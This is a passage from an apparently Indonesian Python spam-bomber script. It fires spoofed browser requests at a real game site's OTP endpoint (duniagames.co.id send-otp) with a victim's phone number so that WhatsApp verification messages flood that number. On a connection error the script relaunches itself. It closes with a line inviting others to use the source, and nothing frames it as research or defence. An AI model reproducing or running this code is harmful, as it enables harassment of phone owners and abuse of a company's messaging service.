br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps({"mobile":"+62"+nomor})).text
		pos=requests.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp",headers={'Host':'api.duniagames.co.id','content-length':'58','sec-ch-ua':'"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"','accept-language':'id','sec-ch-ua-mobile':'?1','user-agent':'Mozilla/5.0 (Linux; Android 12; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','content-type':'application/json','ciam-type':'FR','accept':'application/json, text/plain, */*','x-device':'c44cbb7b-b080-4cd3-8526-a90c0b5d3a98','sec-ch-ua-platform':'"Android"','origin':'https://duniagames.co.id','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://duniagames.co.id/','accept-encoding':'gzip, deflate, br'},data=json.dumps({"phoneNumber":"+62"+nomor,"userName":"0"+nomor})).text
		print (f"  [✓] Spam WhatsApp Selesai")
	except KeyboardInterrupt:
		sys.exit(f"  [!] Program Dihentikan")
	except requests.exceptions.ConnectionError:
    	        os.system("python KANDURA2.py")
if __name__=='__main__':
	#os.system("git pull") ⟨===== hilangkan tanda "#" jika anda upload github
	time.sleep(3)
	main()

# Thn For Use My Source Code
